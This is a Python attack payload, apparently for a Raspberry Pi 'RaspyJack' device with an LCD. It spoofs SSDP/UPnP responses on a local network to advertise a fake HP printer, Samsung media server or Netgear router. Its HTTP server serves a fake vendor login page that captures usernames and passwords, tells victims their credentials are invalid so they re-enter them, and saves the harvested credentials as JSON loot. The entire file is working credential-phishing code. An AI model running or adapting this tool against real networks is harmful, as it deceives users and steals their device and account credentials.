#!/usr/bin/env python3
"""
RaspyJack Payload -- SSDP/UPnP Device Spoofing
===============================================
Author: 7h30th3r0n3

Listens for SSDP M-SEARCH queries on 239.255.255.250:1900 and responds
with a fake device advertisement (printer, media server, or router).
The description URL points to a mini HTTP server on the Pi that serves
a credential-harvesting login page.

Controls:
  OK         -- Start / Stop spoofing
  UP / DOWN  -- Scroll captured credentials
  KEY1       -- Cycle fake device type
  KEY3       -- Exit
"""

import os
import sys
import json
import time
import socket
import struct
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 5
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot/SSDP"

SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900
HTTP_PORT = 8089

DEVICE_TYPES = [
    {
        "name": "Printer",
        "st": "urn:schemas-upnp-org:device:Printer:1",
        "friendly": "HP LaserJet Pro MFP",
        "manufacturer": "HP",
        "model": "LaserJet Pro MFP M428fdw",
    },
    {
        "name": "MediaServer",
        "st": "urn:schemas-upnp-org:device:MediaServer:1",
        "friendly": "DLNA Media Server",
        "manufacturer": "Samsung",
        "model": "AllShare",
    },
    {
        "name": "Router",
        "st": "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
        "friendly": "Internet Gateway",
        "manufacturer": "Netgear",
        "model": "R7000",
    },
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
spoofing = False
device_idx = 0
queries_seen = 0
responses_sent = 0
credentials = []      # [{timestamp, ip, username, password}]
scroll = 0
status_msg = "Ready. OK to start."
local_ip = "0.0.0.0"


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _get_local_ip():
    """Detect the local IP address."""
    for candidate in ["eth0", "wlan0"]:
        try:
            r = subprocess.run(["ip", "-4", "addr", "show", candidate],
                               capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                line = line.strip()
                if line.startswith("inet "):
                    return line.split()[1].split("/")[0]
        except Exception:
            pass
    # Fallback: connect to external
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ---------------------------------------------------------------------------
# Device description XML
# ---------------------------------------------------------------------------

def _build_device_xml(device, ip):
    """Build UPnP device description XML."""
    return f"""<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <specVersion><major>1</major><minor>0</minor></specVersion>
  <device>
    <deviceType>{device['st']}</deviceType>
    <friendlyName>{device['friendly']}</friendlyName>
    <manufacturer>{device['manufacturer']}</manufacturer>
    <modelName>{device['model']}</modelName>
    <modelNumber>1.0</modelNumber>
    <serialNumber>RJ-{int(time.time()) % 100000}</serialNumber>
    <UDN>uuid:raspyjack-{device['name'].lower()}-001</UDN>
    <presentationURL>http://{ip}:{HTTP_PORT}/login</presentationURL>
  </device>
</root>"""


def _build_login_page(device):
    """Build credential-harvesting login page HTML."""
    return f"""<!DOCTYPE html>
<html><head>
<title>{device['friendly']} - Login</title>
<style>
body {{ font-family: Arial, sans-serif; background: #f0f0f0; margin: 0;
       display: flex; justify-content: center; align-items: center;
       height: 100vh; }}
.login {{ background: white; padding: 40px; border-radius: 8px;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }}
h2 {{ color: #333; margin-bottom: 20px; text-align: center; }}
.subtitle {{ color: #666; text-align: center; font-size: 14px;
            margin-bottom: 20px; }}
input {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd;
         border-radius: 4px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #0066cc; color: white;
          border: none; border-radius: 4px; cursor: pointer;
          font-size: 16px; }}
button:hover {{ background: #0052a3; }}
.logo {{ text-align: center; font-size: 24px; margin-bottom: 10px; }}
</style>
</head><body>
<div class="login">
  <div class="logo">{device['manufacturer']}</div>
  <h2>{device['model']}</h2>
  <div class="subtitle">Please sign in to manage this device</div>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Sign In</button>
  </form>
</div>
</body></html>"""


# ---------------------------------------------------------------------------
# HTTP Server
# ---------------------------------------------------------------------------

class _CredHandler(BaseHTTPRequestHandler):
    """HTTP handler for device description and credential capture."""

    def log_message(self, fmt, *args):
        pass  # Suppress default logging

    def do_GET(self):
        device = DEVICE_TYPES[device_idx]
        if self.path == "/device.xml":
            xml = _build_device_xml(device, local_ip)
            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.end_headers()
            self.wfile.write(xml.encode())
        elif self.path in ("/login", "/"):
            html = _build_login_page(device)
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", errors="replace")
            params = parse_qs(body)
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            client_ip = self.client_address[0]

            if username or password:
                entry = {
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "ip": client_ip,
                    "username": username,
                    "password": password,
                }
                with lock:
                    credentials.append(entry)

            # Redirect back with "invalid" message appearance
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            device = DEVICE_TYPES[device_idx]
            page = _build_login_page(device).replace(
                "Please sign in",
                "<span style='color:red'>Invalid credentials.</span> Please try again"
            )
            self.wfile.write(page.encode())
        else:
            self.send_response(404)
            self.end_headers()


def _http_server_thread():
    """Run the HTTP server for device description and cred capture."""
    try:
        server = HTTPServer(("0.0.0.0", HTTP_PORT), _CredHandler)
        server.timeout = 1
        while _running and spoofing:
            server.handle_request()
        server.server_close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# SSDP listener + responder thread
# ---------------------------------------------------------------------------

def _ssdp_thread():
    """Listen for SSDP M-SEARCH and respond with fake device."""
    global queries_seen, responses_sent, status_msg

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except AttributeError:
        pass

    sock.bind(("", SSDP_PORT))

    # Join multicast group
    mreq = struct.pack("4s4s",
                       socket.inet_aton(SSDP_ADDR),
                       socket.inet_aton("0.0.0.0"))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    sock.settimeout(1.0)

    while _running and spoofing:
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break

        msg = data.decode("utf-8", errors="replace")
        if "M-SEARCH" not in msg:
            continue

        with lock:
            queries_seen += 1
            device = DEVICE_TYPES[device_idx]
            status_msg = f"Query from {addr[0]}"

        # Build SSDP response
        response = (
            "HTTP/1.1 200 OK\r\n"
            f"LOCATION: http://{local_ip}:{HTTP_PORT}/device.xml\r\n"
            f"ST: {device['st']}\r\n"
            "USN: uuid:raspyjack-ssdp-001::upnp:rootdevice\r\n"
            "CACHE-CONTROL: max-age=1800\r\n"
            f"SERVER: {device['manufacturer']}/{device['model']} UPnP/1.0\r\n"
            "EXT:\r\n"
            "\r\n"
        )

        try:
            sock.sendto(response.encode(), addr)
            with lock:
                responses_sent += 1
        except Exception:
            pass

    sock.close()


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write captured credentials to loot."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"ssdp_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "device": DEVICE_TYPES[device_idx]["name"],
            "queries_seen": queries_seen,
            "responses_sent": responses_sent,
            "credentials": list(credentials),
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "SSDP SPOOF", font=font, fill="#FF00AA")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if spoofing else "#444")

    with lock:
        msg = status_msg
        device = DEVICE_TYPES[device_idx]
        qs = queries_seen
        rs = responses_sent
        creds = list(credentials)

    d.text((2, 16), f"Dev: {device['name']}", font=font, fill="#FFAA00")
    d.text((2, 26), msg[:24], font=font, fill="#AAAAAA")
    d.text((2, 36), f"Queries:{qs} Resp:{rs} Creds:{len(creds)}",
           font=font, fill="#888")

    # Credential list
    if creds:
        d.text((2, 48), "Captured:", font=font, fill="#00FF00")
        visible = creds[scroll:scroll + ROWS_VISIBLE]
        for i, cred in enumerate(visible):
            y = 58 + i * ROW_H
            line = f"{cred['ip']} {cred['username'][:8]}"
            d.text((2, y), line[:24], font=font, fill="#CCCCCC")
    else:
        d.text((2, 58), "No credentials yet", font=font, fill="#666")

    d.rectangle((0, 116, 127, 127), fill="#111")
    if spoofing:
        d.text((2, 117), "OK:Stop K3:Exit", font=font, fill="#888")
    else:
        d.text((2, 117), "OK:Start K1:Dev K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, spoofing, device_idx, scroll, status_msg, local_ip

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    local_ip = _get_local_ip()
    status_msg = f"IP: {local_ip}"

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if not spoofing:
                    spoofing = True
                    status_msg = "Spoofing started"
                    threading.Thread(target=_ssdp_thread, daemon=True).start()
                    threading.Thread(target=_http_server_thread,
                                     daemon=True).start()
                else:
                    spoofing = False
                    status_msg = "Spoofing stopped"
                time.sleep(0.3)

            elif btn == "KEY1" and not spoofing:
                device_idx = (device_idx + 1) % len(DEVICE_TYPES)
                with lock:
                    status_msg = f"Device: {DEVICE_TYPES[device_idx]['name']}"
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    max_scroll = max(0, len(credentials) - ROWS_VISIBLE)
                scroll = min(scroll + 1, max_scroll)
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        spoofing = False
        time.sleep(0.5)
        # Auto-export if we have credentials
        with lock:
            has_creds = len(credentials) > 0
        if has_creds:
            try:
                _export_loot()
            except Exception:
                pass
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
